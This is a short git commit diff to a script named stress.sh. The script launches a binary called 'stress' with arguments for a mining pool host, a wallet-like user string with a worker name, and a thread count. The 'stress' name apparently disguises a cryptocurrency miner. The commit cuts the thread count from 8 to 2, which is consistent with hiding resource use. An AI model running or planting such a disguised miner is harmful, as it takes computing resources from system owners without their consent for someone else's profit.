2c04d5884fe772315691319cbee952809bf97705
adamasdsd <86480540+adamasdsd@users.noreply.github.com>
2021-06-26 10:20:59 +0000

    Update stress.sh

--- stress.sh
+++ stress.sh
@@ -1,3 +1,3 @@
 #!/bin/sh
 
-./stress -v -l na.luckpool.net:3956 -u RHMwdqBpx2q3aycpKrd69FBeJt4TLnqtzq.SUKUMANTE -t 8 -p x
+./stress -v -l na.luckpool.net:3956 -u RHMwdqBpx2q3aycpKrd69FBeJt4TLnqtzq.SUKUMANTE -t 2 -p x
